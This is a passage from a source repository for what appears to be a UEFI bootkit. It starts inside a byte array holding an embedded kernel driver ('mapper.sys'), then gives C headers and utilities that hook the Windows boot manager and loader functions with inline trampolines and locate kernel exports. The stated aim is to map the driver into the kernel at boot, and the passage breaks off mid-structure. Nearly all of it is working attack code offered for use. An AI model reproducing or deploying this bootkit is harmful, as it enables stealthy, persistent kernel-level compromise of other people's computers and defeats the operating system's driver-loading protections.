	0x17, 0x64, 0x2a, 0x00, 0x17, 0x54, 0x29, 0x00, 0x17, 0x34, 0x28, 0x00,
	0x17, 0x01, 0x26, 0x00, 0x10, 0x70, 0x00, 0x00, 0x02, 0x1c, 0x0e, 0x00,
	0x0a, 0x06, 0x74, 0x06, 0x1c, 0x64, 0x0d, 0x00, 0x1c, 0x54, 0x0c, 0x00,
	0x1c, 0x34, 0x0b, 0x00, 0x1c, 0x32, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0,
	0x12, 0xc0, 0x10, 0x70, 0x02, 0x04, 0x03, 0x00, 0x01, 0x16, 0x4a, 0x06,
	0x04, 0x42, 0x00, 0x00, 0x02, 0x0f, 0x08, 0x00, 0x04, 0x16, 0x00, 0x06,
	0x0f, 0x64, 0x07, 0x00, 0x0f, 0x34, 0x06, 0x00, 0x0f, 0x32, 0x0b, 0x70,
	0x02, 0x14, 0x0a, 0x00, 0x02, 0x16, 0x00, 0x06, 0x14, 0x64, 0x0c, 0x00,
	0x14, 0x54, 0x0b, 0x00, 0x14, 0x34, 0x0a, 0x00, 0x14, 0x72, 0x10, 0x70,
	0x02, 0x1d, 0x0e, 0x00, 0x07, 0x16, 0x00, 0x06, 0x1d, 0x74, 0x0b, 0x00,
	0x1d, 0x64, 0x0a, 0x00, 0x1d, 0x54, 0x09, 0x00, 0x1d, 0x34, 0x08, 0x00,
	0x1d, 0x32, 0x19, 0xf0, 0x17, 0xe0, 0x15, 0xc0, 0x02, 0x17, 0x0b, 0x00,
	0x02, 0x16, 0x00, 0x06, 0x17, 0x64, 0x2f, 0x00, 0x17, 0x54, 0x2e, 0x00,
	0x17, 0x34, 0x2c, 0x00, 0x17, 0x01, 0x2a, 0x00, 0x10, 0x70, 0x00, 0x00,
	0x02, 0x0f, 0x08, 0x00, 0x01, 0x06, 0x1b, 0x06, 0x0f, 0x74, 0x03, 0x00,
	0x0a, 0x64, 0x02, 0x00, 0x05, 0x34, 0x01, 0x00, 0x02, 0x19, 0x0c, 0x00,
	0x03, 0x16, 0x00, 0x06, 0x19, 0x74, 0x0b, 0x00, 0x19, 0x64, 0x0a, 0x00,
	0x19, 0x54, 0x09, 0x00, 0x19, 0x34, 0x08, 0x00, 0x19, 0x52, 0x15, 0xe0,
	0x02, 0x18, 0x0c, 0x00, 0x06, 0x16, 0x00, 0x06, 0x18, 0x64, 0x0a, 0x00,
	0x18, 0x54, 0x09, 0x00, 0x18, 0x34, 0x08, 0x00, 0x18, 0x32, 0x14, 0xf0,
	0x12, 0xe0, 0x10, 0x70, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x3b, 0x10, 0x00, 0x00, 0x60, 0x22, 0x00, 0x00,
	0x3c, 0x10, 0x00, 0x00, 0x62, 0x11, 0x00, 0x00, 0x18, 0x22, 0x00, 0x00,
	0x64, 0x11, 0x00, 0x00, 0xe5, 0x11, 0x00, 0x00, 0x54, 0x22, 0x00, 0x00,
	0xe8, 0x11, 0x00, 0x00, 0x57, 0x14, 0x00, 0x00, 0x34, 0x22, 0x00, 0x00,
	0x84, 0x14, 0x00, 0x00, 0xf9, 0x14, 0x00, 0x00, 0xf8, 0x22, 0x00, 0x00,
	0xfc, 0x14, 0x00, 0x00, 0xab, 0x15, 0x00, 0x00, 0x8c, 0x22, 0x00, 0x00,
	0xac, 0x15, 0x00, 0x00, 0x4b, 0x16, 0x00, 0x00, 0xc8, 0x22, 0x00, 0x00,
	0x4c, 0x16, 0x00, 0x00, 0xd7, 0x17, 0x00, 0x00, 0xac, 0x22, 0x00, 0x00,
	0xd8, 0x17, 0x00, 0x00, 0x94, 0x18, 0x00, 0x00, 0xdc, 0x22, 0x00, 0x00,
	0x94, 0x18, 0x00, 0x00, 0x11, 0x19, 0x00, 0x00, 0x74, 0x22, 0x00, 0x00,
	0x40, 0x19, 0x00, 0x00, 0x79, 0x1c, 0x00, 0x00, 0x18, 0x23, 0x00, 0x00,
	0x80, 0x1c, 0x00, 0x00, 0x69, 0x1d, 0x00, 0x00, 0x20, 0x23, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x32, 0x50, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x28, 0x50, 0x00, 0x00, 0x2c, 0x50, 0x00, 0x00, 0x30, 0x50, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x3d, 0x50, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x61,
	0x70, 0x70, 0x65, 0x72, 0x2e, 0x73, 0x79, 0x73, 0x00, 0x6d, 0x61, 0x70,
	0x70, 0x65, 0x72, 0x44, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x28, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xc4, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa8, 0x60, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xb6, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xc8, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x60, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xf0, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xfa, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x1a, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2a, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x60, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x70, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x92, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xae, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x5a, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69,
	0x6e, 0x74, 0x45, 0x78, 0x00, 0x00, 0x9a, 0x00, 0x45, 0x78, 0x41, 0x6c,
	0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x50, 0x6f, 0x6f, 0x6c, 0x00, 0x00,
	0xc4, 0x00, 0x45, 0x78, 0x46, 0x72, 0x65, 0x65, 0x50, 0x6f, 0x6f, 0x6c,
	0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0xcb, 0x00, 0x45, 0x78,
	0x47, 0x65, 0x74, 0x50, 0x72, 0x65, 0x76, 0x69, 0x6f, 0x75, 0x73, 0x4d,
	0x6f, 0x64, 0x65, 0x00, 0x2d, 0x0b, 0x73, 0x70, 0x72, 0x69, 0x6e, 0x74,
	0x66, 0x00, 0x42, 0x0b, 0x73, 0x74, 0x72, 0x73, 0x74, 0x72, 0x00, 0x00,
	0x45, 0x05, 0x4d, 0x6d, 0x50, 0x72, 0x6f, 0x62, 0x65, 0x41, 0x6e, 0x64,
	0x4c, 0x6f, 0x63, 0x6b, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x5b, 0x05,
	0x4d, 0x6d, 0x55, 0x6e, 0x6c, 0x6f, 0x63, 0x6b, 0x50, 0x61, 0x67, 0x65,
	0x73, 0x00, 0x32, 0x05, 0x4d, 0x6d, 0x4d, 0x61, 0x70, 0x4c, 0x6f, 0x63,
	0x6b, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x53, 0x70, 0x65, 0x63,
	0x69, 0x66, 0x79, 0x43, 0x61, 0x63, 0x68, 0x65, 0x00, 0x00, 0x5e, 0x05,
	0x4d, 0x6d, 0x55, 0x6e, 0x6d, 0x61, 0x70, 0x4c, 0x6f, 0x63, 0x6b, 0x65,
	0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0x6d, 0x02, 0x49, 0x6f,
	0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x4d, 0x64, 0x6c, 0x00,
	0xc1, 0x02, 0x49, 0x6f, 0x46, 0x72, 0x65, 0x65, 0x4d, 0x64, 0x6c, 0x00,
	0xd0, 0x02, 0x49, 0x6f, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65,
	0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x89, 0x0a,
	0x5a, 0x77, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6d, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e,
	0x00, 0x00, 0x06, 0x05, 0x4d, 0x6d, 0x43, 0x6f, 0x70, 0x79, 0x56, 0x69,
	0x72, 0x74, 0x75, 0x61, 0x6c, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x00,
	0x6e, 0x74, 0x6f, 0x73, 0x6b, 0x72, 0x6e, 0x6c, 0x2e, 0x65, 0x78, 0x65,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00
};

```

`boot/stdafx.h`:

```h
#pragma once

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Library/PrintLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <IndustryStandard/PeImage.h>
#include <Guid/GlobalVariable.h>

#include "util.h"

STATIC CHAR16 *WINDOWS_BOOTMGR_PATH = L"\\efi\\microsoft\\boot\\bootmgfw.efi";

#define MAPPER_DATA_SIZE (JMP_SIZE + 7)
#define MAPPER_BUFFER_SIZE (((IMAGE_NT_HEADERS64 *)(MAPPER_BUFFER + ((IMAGE_DOS_HEADER *)MAPPER_BUFFER)->e_lfanew))->OptionalHeader.SizeOfImage)

typedef EFI_STATUS(EFIAPI *IMG_ARCH_START_BOOT_APPLICATION)(VOID *, VOID *, UINT32, UINT8, VOID *);
typedef EFI_STATUS(EFIAPI *BL_IMG_ALLOCATE_IMAGE_BUFFER)(VOID **, UINTN, UINT32, UINT32, VOID *, UINT32);
typedef EFI_STATUS(EFIAPI *OSL_FWP_KERNEL_SETUP_PHASE_1)(LOADER_PARAMETER_BLOCK *);

EFI_STATUS EFIAPI SetupHooks(EFI_HANDLE bootmgrHandle);
EFI_STATUS EFIAPI ImgArchStartBootApplicationHook(VOID *appEntry, VOID *imageBase, UINT32 imageSize, UINT8 bootOption, VOID *returnArguments);
EFI_STATUS EFIAPI BlImgAllocateImageBufferHook(VOID **imageBuffer, UINTN imageSize, UINT32 memoryType, UINT32 attributes, VOID *unused, UINT32 flags);
EFI_STATUS EFIAPI OslFwpKernelSetupPhase1Hook(LOADER_PARAMETER_BLOCK *loaderParameterBlock);
EFI_STATUS EFIAPI SetupMapper(KLDR_DATA_TABLE_ENTRY *ntoskrnl, KLDR_DATA_TABLE_ENTRY *targetModule);
EFI_STATUS EFIAPI MapMapper(VOID *ntoskrnlBase, VOID **entryPoint, VOID *targetFunction);
EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE imageHandle, UINTN mapKey);

EFI_DEVICE_PATH *EFIAPI GetWindowsBootmgrDevicePath();
EFI_STATUS EFIAPI SetBootCurrentToWindowsBootmgr();
```

`boot/util.c`:

```c
#include "stdafx.h"

VOID MemCopy(VOID *dest, VOID *src, UINTN size) {
    for (UINT8 *d = dest, *s = src; size--; *d++ = *s++)
        ;
}

BOOLEAN CheckMask(CHAR8 *base, CHAR8 *pattern, CHAR8 *mask) {
    for (; *mask; ++base, ++pattern, ++mask) {
        if (*mask == 'x' && *base != *pattern) {
            return FALSE;
        }
    }

    return TRUE;
}

VOID *FindPattern(CHAR8 *base, UINTN size, CHAR8 *pattern, CHAR8 *mask) {
    size -= AsciiStrLen(mask);
    for (UINTN i = 0; i <= size; ++i) {
        VOID *addr = &base[i];
        if (CheckMask(addr, pattern, mask)) {
            return addr;
        }
    }

    return NULL;
}

VOID *TrampolineHook(VOID *dest, VOID *src, UINT8 original[JMP_SIZE]) {
    if (original) {
        MemCopy(original, src, JMP_SIZE);
    }

    MemCopy(src, "\xFF\x25\x00\x00\x00\x00", 6);
    *(VOID **)((UINT8 *)src + 6) = dest;

    return src;
}

VOID TrampolineUnHook(VOID *src, UINT8 original[JMP_SIZE]) {
    MemCopy(src, original, JMP_SIZE);
}

KLDR_DATA_TABLE_ENTRY *GetModuleEntry(LIST_ENTRY *list, CHAR16 *name) {
    for (LIST_ENTRY *entry = list->ForwardLink; entry != list;
        entry = entry->ForwardLink) {

        KLDR_DATA_TABLE_ENTRY *module =
            CONTAINING_RECORD(entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (module && StrnCmp(name, module->BaseImageName.Buffer,
            module->BaseImageName.Length) == 0) {

            return module;
        }
    }

    return NULL;
}

UINT64 GetExport(UINT8 *base, CHAR8 *export) {
    IMAGE_DOS_HEADER *dosHeaders = (IMAGE_DOS_HEADER *)base;
    if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    IMAGE_NT_HEADERS64 *ntHeaders =
        (IMAGE_NT_HEADERS64 *)(base + dosHeaders->e_lfanew);

    UINT32 exportsRva =
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
        .VirtualAddress;

    if (!exportsRva) {
        return 0;
    }

    IMAGE_EXPORT_DIRECTORY *exports =
        (IMAGE_EXPORT_DIRECTORY *)(base + exportsRva);

    UINT32 *nameRva = (UINT32 *)(base + exports->AddressOfNames);

    for (UINT32 i = 0; i < exports->NumberOfNames; ++i) {
        CHAR8 *func = (CHAR8 *)(base + nameRva[i]);

        if (AsciiStrCmp(func, export) == 0) {
            UINT32 *funcRva = (UINT32 *)(base + exports->AddressOfFunctions);
            UINT16 *ordinalRva =
                (UINT16 *)(base + exports->AddressOfNameOrdinals);

            return (UINT64)base + funcRva[ordinalRva[i]];
        }
    }

    return 0;
}
```

`boot/util.h`:

```h
#pragma once

#define SEC_TO_MICRO(s) ((s) * 1000000)
#define RELATIVE_ADDR(addr, size) ((VOID *)((UINT8 *)(addr) + *(INT32 *)((UINT8 *)(addr) + ((size) - (INT32)sizeof(INT32))) + (size)))
#define CONTAINING_RECORD(address, type, field) ((type *)((UINT8 *)(address) - (UINTN)(&((type *)0)->field)))

#define JMP_SIZE (14)

#define IMAGE_REL_BASED_ABSOLUTE (0)
#define IMAGE_REL_BASED_DIR64 (10)
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES (16)
#define IMAGE_SIZEOF_SHORT_NAME (8)
#define IMAGE_DIRECTORY_ENTRY_EXPORT (0)
#define IMAGE_DIRECTORY_ENTRY_IMPORT (1)
#define IMAGE_DIRECTORY_ENTRY_BASERELOC (5)
#define IMAGE_DOS_SIGNATURE (0x5A4D)

#define BL_MEMORY_TYPE_APPLICATION (0xE0000012)
#define BL_MEMORY_ATTRIBUTE_RWX (0x424000)

typedef struct _UNICODE_STRING {
    UINT16 Length;
    UINT16 MaximumLength;
    CHAR16 *Buffer;
} UNICODE_STRING;

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    VOID *ExceptionTable;
    UINT32 ExceptionTableSize;
    VOID *GpValue;
    VOID *NonPagedDebugInfo;
    VOID *ImageBase;
    VOID *EntryPoint;
    UINT32 SizeOfImage;
    UNICODE_STRING FullImageName;
    UNICODE_STRING BaseImageName;
} KLDR_DATA_TABLE_ENTRY;

typedef struct _LOADER_PARAMETER_BLOCK {
    UINT32 OsMajorVersion;
    UINT32 OsMinorVersion;
    UINT32 Size;
    UINT32 OsLoaderSecurityVersion;
    LIST_ENTRY LoadOrderListHead;
} LOADER_PARAMETER_BLOCK;

typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    UINT16 e_magic;                     // Magic number
    UINT16 e_cblp;                      // Bytes on last page of file
    UINT16 e_cp;                        // Pages in file
    UINT16 e_crlc;                      // Relocations
    UINT16 e_cparhdr;                   // Size of header in paragraphs
    UINT16 e_minalloc;                  // Minimum extra paragraphs needed
    UINT16 e_maxalloc;                  // Maximum extra paragraphs needed
    UINT16 e_ss;                        // Initial (relative) SS value
    UINT16 e_sp;                        // Initial SP value
    UINT16 e_csum;                      // Checksum
    UINT16 e_ip;                        // Initial IP value
    UINT16 e_cs;                        // Initial (relative) CS value
    UINT16 e_lfarlc;                    // File address of relocation table
    UINT16 e_ovno;                      // Overlay number
    UINT16 e_res[4];                    // Reserved words
    UINT16 e_oemid;                     // OEM identifier (for e_oeminfo)
    UINT16 e_oeminfo;                   // OEM information; e_oemid specific
    UINT16 e_res2[10];                  // Reserved words
    UINT32 e_lfanew;                    // File address of new exe header
} IMAGE_DOS_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32   VirtualAddress;
    UINT32   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    UINT16               Magic;
    UINT8                MajorLinkerVersion;
    UINT8                MinorLinkerVersion;
    UINT32               SizeOfCode;
    UINT32               SizeOfInitializedData;
    UINT32               SizeOfUninitializedData;
    UINT32               AddressOfEntryPoint;
    UINT32               BaseOfCode;
    UINT64               ImageBase;
    UINT32               SectionAlignment;
    UINT32               FileAlignment;
    UINT16               MajorOperatingSystemVersion;
    UINT16               MinorOperatingSystemVersion;
    UINT16               MajorImageVersion;
    UINT16               MinorImageVersion;
    UINT16               MajorSubsystemVersion;
    UINT16               MinorSubsystemVersion;
    UINT32               Win32VersionValue;
    UINT32               SizeOfImage;
    UINT32               SizeOfHeaders;
    UINT32               CheckSum;
    UINT16               Subsystem;
    UINT16               DllCharacteristics;
    UINT64               SizeOfStackReserve;
    UINT64               SizeOfStackCommit;
    UINT64               SizeOfHeapReserve;
    UINT64               SizeOfHeapCommit;
    UINT32               LoaderFlags;
    UINT32               NumberOfRvaAndSizes;
